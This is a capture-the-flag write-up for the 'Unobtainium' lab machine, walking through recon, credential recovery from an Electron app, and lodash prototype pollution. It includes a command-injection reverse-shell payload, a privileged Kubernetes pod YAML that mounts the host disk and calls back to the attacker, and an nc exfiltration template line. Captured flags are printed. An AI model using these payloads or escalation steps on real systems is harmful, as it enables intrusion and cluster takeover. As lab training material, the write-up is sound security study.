# Unobtainium

export IP=10.10.10.235

# Solution

Starting with the national tradition, a nmap scannnn boy 
```bash

cmd: sudo nmap -sC -sV -oN nmap/initial $IP

22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
80/tcp    open  http          Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 05 May 2021 17:32:40 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 05 May 2021 17:32:38 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 05 May 2021 17:32:39 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2021-05-04T04:18:49
|_Not valid after:  2022-05-05T04:18:49
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
31337/tcp open  http          Node.js Express framework
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
``` 

Some interesting findings... Node.js running in 31337 with potentially risky methods (PUT and DELETE) <br>

Lets check the port 80 <br>

Wappalyzer confirms nmap versions
```c

Apache  -> 2.4.41
jQuery  -> 3.4.1
OS      -> Ubuntu
``` 

From the webpage we can download 3 archives (**/downloads** directory). It also states that it is a **chat application**

```R
[TXT]	checksums.txt	2021-03-24 10:19 	188 	 
[ ]	unobtainium_debian.zip	2021-03-24 10:23 	52M	 
[ ]	unobtainium_redhat.zip	2021-03-24 10:25 	52M	 
[ ]	unobtainium_snap.zip	2021-03-24 10:24 	62M	 
```

While it is downloading, lets fuzz the apache server with feroxbuster (a recursive gobuster :p). I'll use 2 or 3 wordlists (different scans) just in case
```bash
# cmd: feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 80 -o fuzz/ferox_apache_bigtxt.log

301        9l       28w      316c http://10.10.10.235/downloads
301        9l       28w      313c http://10.10.10.235/assets
403        9l       28w      277c http://10.10.10.235/.htaccess
403        9l       28w      277c http://10.10.10.235/.htpasswd
403        9l       28w      277c http://10.10.10.235/downloads/.htaccess
403        9l       28w      277c http://10.10.10.235/server-status
301        9l       28w      313c http://10.10.10.235/images
403        9l       28w      277c http://10.10.10.235/assets/.htaccess
403        9l       28w      277c http://10.10.10.235/assets/.htpasswd
301        9l       28w      316c http://10.10.10.235/assets/js
403        9l       28w      277c http://10.10.10.235/images/.htaccess
403        9l       28w      277c http://10.10.10.235/images/.htpasswd
403        9l       28w      277c http://10.10.10.235/assets/js/.htaccess
403        9l       28w      277c http://10.10.10.235/assets/js/.htpasswd

--- SNIP ---
# WORDLIST: Apache.fuzz.txt

403        9l       28w      277c http://10.10.10.235/.htaccess.bak  # <------ interesting

--- SNIP ---
# WORDLIST: raft-medium-words

nothing interesting

``` 

Found several pictures that are not displayed in the main page, lets quick check steganography
```bash
# Images listing
[IMG]	pic01.jpg	2019-06-06 22:16 	5.4K	 
[IMG]	pic02.jpg	2019-06-06 22:16 	5.5K	 
[IMG]	pic03.jpg	2019-06-06 22:16 	5.6K	 
[IMG]	pic04.jpg	2019-06-06 22:16 	13K	 
[IMG]	pic05.jpg	2019-06-06 22:16 	3.0K	 
[IMG]	screen.jpg	2019-06-06 22:16 	6.6K	 

# cmd: stegseek --crack -wl rockyou.txt -sf <image_name>.jpg
# results: No results
```

Before jumping into the the other stuff, just do some more enum (VHOSTS)... Nothing found <br>

Lets jump into the large zips... I'll assume that they're all the same app so will work with the **.deb** one. Lets extract the package
```bash 
cmd: ar vx unobtainium_1.0.0_amd64.deb
x - debian-binary
x - control.tar.gz
x - data.tar.xz

cmd: tar xfvz control.tar.gz
./
./postinst
./postrm
./control
./md5sums

cmd: xz --decompress data.tar.xz  # decompressed to data.tar
cmd: tar -xvf data.tar            # extracted two folders ./opt and ./usr 
cmd: file *
control:       ASCII text
debian-binary: ASCII text
md5sums:       ASCII text
opt:           directory
postinst:      Bourne-Again shell script, ASCII text executable
postrm:        Bourne-Again shell script, ASCII text executable
usr:           directory
``` 

From the control file, we can see a host and a pottential email address
``` 
Vendor: felamos <felamos@unobtainium.htb>
Homepage: http://unobtainium.htb
``` 

Fiddling around did not found much. Trying to run the elf at **/opt/unobtainium/** the app tells that cant reach **unobtainium.htb** so i just added it to **/etc/hosts** and the app worked <br>

The app also has a todo section
```json
{   
    "ok":true,
    "content":"1. Create administrator zone.\n
                2. Update node JS API Server.\n
                3. Add Login functionality.\n
                4. Complete Get Messages feature.\n
                5. Complete ToDo feature.\n
                6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n
                7. Improve security\n"
}
``` 

Now we can see that it can communicate with the we application we can set a proxy and see what it is sending. Unfortunately it did not worked for me but for a friend of mine the procedure was simple and worked straight away
1. set env variable http_proxy=127.0.0.1:8080
2. run ./obtainium

My friend also proceded to help me and we found a [resource](https://github.com/electron/asar) which lets extract stuff from the electron app resources **.asar** file. Another option would be to user wireshark and intercept the login traffic (since it is http, is plain text) <br>

We got some files
```js
// File: todo.js
$.ajax({
    url: 'http://unobtainium.htb:31337/todo',
    type: 'post',
    dataType:'json',
    contentType:'application/json',
    processData: false,
    data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}),
    success: function(data) {
        $("#output").html(JSON.stringify(data));
    }
});

``` 

We have creds to the API :D <br>

Here's what i've tested the creds for (also, in the application there was a reference to an **Admin** user as logged in):
```bash 
# SSH
admin:Winter2021
felamos:Winter2021
Admin:Winter2021
``` 

Also tried the kubernetes at **8443** but without success <br>

The next thing was trying to mess with the todo request to read other files. Tried a completely random name (File: thisisnotafile) and the connection just hanged until it eventually timed out. But when i tried an empty file name something interesting happened <br>

Note: i used burp repeater to try stuff out but the curl command below would also trigger the same error
```bash
cmd: curl -X POST --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : ""}' -H "Content-Type: application/json" http://unobtainium.htb:31337/todo

Error: ENOENT: no such file or directory, open
&nbsp; &nbsp;at Object.openSync (fs.js:476:3)
&nbsp; &nbsp;at Object.readFileSync (fs.js:377:35)
&nbsp; &nbsp;at /usr/src/app/index.js:86:41
&nbsp; &nbsp;at Array.forEach (&lt;anonymous&gt;)
&nbsp; &nbsp;at /usr/src/app/index.js:84:36
&nbsp; &nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
&nbsp; &nbsp;at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)
&nbsp; &nbsp;at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)
&nbsp; &nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
&nbsp; &nbsp;at /usr/src/app/node_modules/express/lib/router/index.js:281:22
```

We can see that it errors out in the **/usr/src/app/index.js** file but trying to read it just hangs. Usually, even when running from the same directory, the paths present in error are just absolute which made me try the file name of **index.js** only ! And it payed off !!! 

```json
{"ok":true,"content":"var root = require(\"google-cloudstorage-commands\");
-- snip-- 
``` 

The code extracted from the json
```js
var root = require("google-cloudstorage-commands");
const express = require('express');
const { exec } = require("child_process");     
const bodyParser = require('body-parser');     
const _ = require('lodash');                                                                  
const app = express();
var fs = require('fs');
                                                                                              
const users = [                                                                               
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      
];

let messages = [];                             
let lastId = 1;                                
                                                                                              
function findUser(auth) {                                                                     
  return users.find((u) =>                                                                    
    u.name === auth.name &&                                                                   
    u.password === auth.password);                                                            
}                                    
                                               
app.use(bodyParser.json());                                                                   
                                               
app.get('/', (req, res) => {                   
  res.send(messages);                                                                         
});                                                                                           
                                                                                              
app.put('/', (req, res) => {   
  const user = findUser(req.body.auth || {});                                                 
                                               
  if (!user) {                                 
    res.status(403).send({ok: false, error: 'Access denied'});                                
    return;
  }

  const message = {
    icon: '__',
  };

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
});

app.delete('/', (req, res) => {
  const user = findUser(req.body.auth || {});

  if (!user || !user.canDelete) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  messages = messages.filter((m) => m.id !== req.body.messageId);
  res.send({ok: true});
});
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }


  filename = req.body.filename;
  root.upload("./",filename, true);
  res.send({ok: true, Uploaded_File: filename});
});

app.post('/todo', (req, res) => {
    const user = findUser(req.body.auth || {});
    if (!user) {
        res.status(403).send({ok: false, error: 'Access denied'});
        return;
    }

    filename = req.body.filename;
    testFolder = "/usr/src/app";
    fs.readdirSync(testFolder).forEach(file => {
        if (file.indexOf(filename) > -1) {
                var buffer = fs.readFileSync(filename).toString();
                res.send({ok: true, content: buffer});
        }
    });
});

app.listen(3000);
console.log('Listening on port 3000...');

```

We can see several things that are interesting:
1. an admin account but its password is random generated (no luck here)
2. an /upload endpoint
3. a logging variable (messages) which is then sent to users when a get is issued to the root directory

What can we do on each:
1. Nothing
2. The user needs the **canUpload** attribute set to **True**

The third one is a more interesting one. I was discussing with my friend if we could somehow inject something through the **/todo** endpoint since it uses the request to populate the logging variable
```js
const _ = require("lodash")

// -- snip --
const message = {
    icon: '__',
};

_.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
});

messages.push(message);
```

Since i didn't knew what lodash was, i went on the google hunting... Found nothing, just that **lodash.merge** joins both dicts into the first <br>
After several time he said that he remembered existing several **prototype pollution** vulnerabilities related to this exact thing (one [here](https://hackerone.com/reports/310443)) <br>

We just need to craft a special payload to pollute **__prototype__** to always set **canUpload=True** on every obect
```bash
# REQUEST -> PUT /
PUT / HTTP/1.1
Host: unobtainium.htb:31337

--- snip ---

{"auth": {"name": "felamos", "password": "Winter2021"},"message":{"__proto__":{"canUpload":true}}}

# POST /upload response
HTTP/1.1 200 OK

--- snip ---

{"ok":true}
```

Now we can upload files !! <br>

I searched google for the function definition and did not found it, then i installed it with npm and displayed it as follow
```bash
cmd: npm install google-cloudstorage-commands
cmd: node
node$: const g = require("google-cloudstorage-commands")
node$: console.log(g.upload.toString()) 

function upload(inputDirectory, bucket, force = false) {
    return new Promise((yes, no) => {
        let _path = path.resolve(inputDirectory)
        let _rn = force ? '-r' : '-Rn'
        let _cmd = exec(`gsutil -m cp ${_rn} -a public-read ${_path} ${bucket}`)
        _cmd.on('exit', (code) => {
            yes()
        })
    })
}
``` 

We can clearily see that it **exec's** the command in the command line and is vulnerable to command hijack because **${bucket}** is not sanitized neither before nor inside the function <br>

In this case, we can control it with the **filename** value
```js
root.upload("./",filename, true);
```

And we send the following request
```bash
POST /upload HTTP/1.1
Host: unobtainium.htb:31337

--- snip ---

{"auth": {"name": "felamos", "password": "Winter2021"},"filename":"$(/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.63/1414 0>&1')"}
```

And Voila!! 
```bash
cmd: whoami && id && uname -a

uid=0(root) gid=0(root) groups=0(root)
Linux webapp-deployment-5d764566f4-mbprj 5.4.0-70-generic #78-Ubuntu SMP Fri Mar 19 13:29:52 UTC 2021 x86_64 GNU/Linux

cmd: ls -la ~
-rw-r--r-- 2 root root   33 May  6 21:32 user.txt

cmd: cat ~/user.txt
# FLAG: f8bd148eb3f2191b87502dff9db76e6c
``` 

Well, we are root because we are inside a kubernetes **pod** (a container) <br>

Then i ran linux-smart-enumeration. Since we are in a kubernetes pod is expected that the next steps are towards that tecnologie so i filtered the output to just include **kube** in it

```bash
cmd: ./lse.sh | tee log
cmd: cat log | grep kube

/etc/cron.d/clear-kubectl
/usr/src/app/clear-kubectl
/run/secrets/kubernetes.io
/run/secrets/kubernetes.io/serviceaccount/..data
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/ca.crt
/run/secrets/kubernetes.io/serviceaccount/token
* * * * * find / -name kubectl -exec rm {} \;
/etc/cron.d/clear-kubectl
/etc/cron.d/clear-kubectl:* * * * * find / -name kubectl -exec rm {} \;
/etc/cron.d/clear-kubectl:* * * * * find / -name kubectl -exec rm {} \;
``` 

We can see a cron to remove kubectl from the container <br>
Checking the folder we see that, at **/run/secrets/kubernetes.io/serviceaccount/**, there's only a folder with 3 files with everything else being symlinks
```bash
cmd: cd ..2021_05_07_04_19_27.974814721
cmd: ls -la
-rw-r--r-- 1 root root 1066 May  7 04:19 ca.crt
-rw-r--r-- 1 root root    7 May  7 04:19 namespace # <- just says default
-rw-r--r-- 1 root root  900 May  7 04:19 token
```

Downloaded the files to my local machine (by b64 encode them and decoding to files because no netcat nor python) <br>

From the [kubernetes docs](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/) we can verify if we can in fact connect to the master node

```json
cmd: curl --cacert ca.crt --header "Authorization: Bearer $(cat token)" -X GET https://10.10.10.235:8443/api            

{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "10.10.10.235:8443"
    }
  ]
}
```

I tried to configure the **Kubectl** locally (without success), so i uploaded the binary to the machine with a different name (**kube**)<br>

```bash
cmd: ./kube get namespaces

default           Active   110d
dev               Active   110d
kube-node-lease   Active   110d
kube-public       Active   110d
kube-system       Active   110d
```

Checking the pods (workers) for the namespaces revealed that we only have permissions to interact with the **dev** namespace

```bash
cmd: ./kube get pod -n default

Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "default"

cmd: ./kube get pod -n dev
NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         110d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         110d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         110d
```

We can see that the namespace **dev** have 3 pods each with one container. Lets see the description of one of them (the description is pretty long)

```bash
cmd: ./kube describe pod devnode-deployment-cd86fb5c-6ms8d -n dev

Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  <none>
Status:       Running
IP:           172.17.0.6
IPs:
  IP:           172.17.0.6
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://efed6e14b36f253aeb9558eebb797b39cc4330dffd056a477c7d1ba07d405766
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Fri, 07 May 2021 19:13:18 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Wed, 24 Mar 2021 16:01:28 +0000
      Finished:     Wed, 24 Mar 2021 16:02:13 +0000
    Ready:          True
    Restart Count:  28
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          <none>
```

It is running **Node.js** on port **3000** at **172.17.0.6**. Checking if the app is the same, using the same procedure as for the webapp environment, the returned **index.js** is exactly equal <br>

In the **devnode-deployment-cd86fb5c-6ms8d** pod, we are also root and **kubectl** was also removed via **crontab**. Similliarly to the **webapp-deployment-5d764566f4-h5zhw** pod, we have the token in the **/var/run/kubernetes(...)** folder <br>


After this it was not feasible to do things by uploading the kubectl binary and procceed so, me and my friend, went on a journey to discover a new mean to connect locally to the pods (the documentation is **HORRIBLE** to say the least). <br>

So we discovered that we could access with the following command 
```bash
kubectl --token=$TOKEN --certificate-authority=ca.cert --server=http://10.10.10.235:8443/ <commands>
```

**NOTE:** From here on is where i describe what i did because i get kinda lost and left notes a bit behind <br> 

We discovered to have no permissions to do anything with the service account present in the **dev** pod. But, why?! Well because we didn't knew that we could specify the namespace ! When we tested the previously seen namespaces we got a really conforting surprise
```
cmd: kubectl --token="$(cat token)" --certificate-authority=ca.cert --server=https://10.10.10.235:8443/ auth can-i --list -n kube-system 
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]

-- snip --
```

We can read **secrets** from **kube-system** !!! 

There's a quickly foundable way of exploiting kubernetes with bootstrap-signer token (which we have) but in this case the RBAC was forbidding us from doing so <br>

So i then listed all the secrets and described them (to disclose their token so i could make requests with them)
```bash
# listing the secrets

cmd: kubectl --token=$TOKEN --server=https://10.10.10.235:8443 --certificate-authority=ca.cert get secret -n kube-system

NAME                                             TYPE                                  DATA   AGE
attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      113d
bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      113d
c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      113d
certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      113d
clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      113d
coredns-token-dbp92                              kubernetes.io/service-account-token   3      113d
cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      113d
daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      113d
default-token-l85f2                              kubernetes.io/service-account-token   3      113d
deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      113d
disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      113d
endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      113d
endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      113d
endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      113d
expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      113d
generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      113d
horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      113d
job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      113d
kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      113d
namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      113d
node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      113d
persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      113d
pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      113d
pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      113d
pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      113d
replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      113d
replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      113d
resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      113d
root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      113d
service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      113d
service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      113d
statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      113d
storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      113d
token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      113d
ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      113d

# describing the secrets
cmd: kubectl --token=$TOKEN --server=https://10.10.10.235:8443 --certificate-authority=ca.cert describe secret -n kube-system > readable_secrets.list

# THE FULL LIST WILL BE IN THE REPO
``` 

So i found a pretty cool [presentation](https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf) (made at RSA conference in 2020) which disclaims the most relevant tokens and how to exploit them if we have access to them (also depending on their capabilities over the pods)  <br>

So i went and inspected some secrets until i found something interesting and, to short the notes i'll post only some of them <br>

The process to enumerate them is pretty straight-forward by:
1. setting the environment variable with the token
2. perform <auth can-i> command on the namespace
  
```bash
cmd: kubectl --token=$TOKEN --server=https://10.10.10.235:8443 --certificate-authority=ca.cert auth can-i --list -n kube-system

-> service-account-token
pods ... [create delete list patch watch]

-> statefulset-controller-token-z2nsd
pods ... [list watch create delete get patch update]

-> c-admin-token-tfmp2
*.* ... [*]
``` 

So we can see that the **c-admin-token-tfmp2** secret can do **ANYTHING** so we can procceed to exploit the kubernetes by creating a malicious pod <br>

For it to be quicker we need an image that we know that will work right away and for that i dumped the webapp deploy configuration
```bash
# get available deploys to view

cmd: kubectl --token=$TOKEN --server=https://10.10.10.235:8443 --certificate-authority=ca.cert get deploy 
NAME                READY   UP-TO-DATE   AVAILABLE   AGE
webapp-deployment   3/3     3            3           114d

# get the config
cmd:kubectl --token=$TOKEN --server=https://10.10.10.235:8443 --certificate-authority=ca.cert get deploy webapp-deployment -o yaml > (..)webapp-files/webapp_deploy.yaml
-- snip --
- image: localhost:5000/node_server
-- snip --
```

So now we need to create the **malicious.yaml** pod template (from the presentation)
```yaml
# -- snip --
    args: ["-c", "mkdir /mnt1; mount /dev/xvda1 /mnt1; ls /mnt1/ | nc <attacker_ip> 6666;'"]
# -- snip --
``` 

Well, we need a device name (volume/disk) so we can mount the host filesystem. This completely flew over my head but my friend saved me (REALLY) <br>

We managed to get the host volume by using **df** 
```bash
cmd: df -a
-- snip --
/dev/sda2       13867048 8791412   4917708  65% /dev/termination-log
/dev/sda2       13867048 8791412   4917708  65% /etc/resolv.conf
/dev/sda2       13867048 8791412   4917708  65% /etc/hostname
/dev/sda2       13867048 8791412   4917708  65% /etc/hosts
-- snip --
```

Well, we now have it all folks !!! lets fill the template 
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: wazapod
spec:
  containers:
  - name: waza
    image: localhost:5000/node_server
    command: ["/bin/bash"]
    args: ["-c", "mkdir /root_mount; mount /dev/sda2 /root_mount; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.62/1414 0>&1;'"]
    securityContext:
      privileged: true
  hostNetwork: true
```
and execute it
```bash
# apply the pod config
cmd: kubectl --token=$TOKEN --server=https://10.10.10.235:8443 --certificate-authority=dev-files/ca.cert apply -f ./malicious_pod.yaml
pod/wazapod created

# at another tmux pane
cmd$local: nc -lvvnp 1414
connect to [10.10.16.62] from (UNKNOWN) [10.10.10.235] 43732
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
cmd$remote: whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

cmd$remote: ls -la /root_mount/root/
# -- snip-- 
drwxr-xr-x 10 root root 4096 Jan 17 06:23 .minikube
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rwxr-xr-x  1 root root 3300 Feb 15 18:34 pod_cleanup.py
-rw-r--r--  1 root root   33 May 11 04:18 root.txt

cmd$remote: cat /root_mount/root/root.txt

#FLAG: 9893bfbca6efd2946bcbb9016bf0243a
```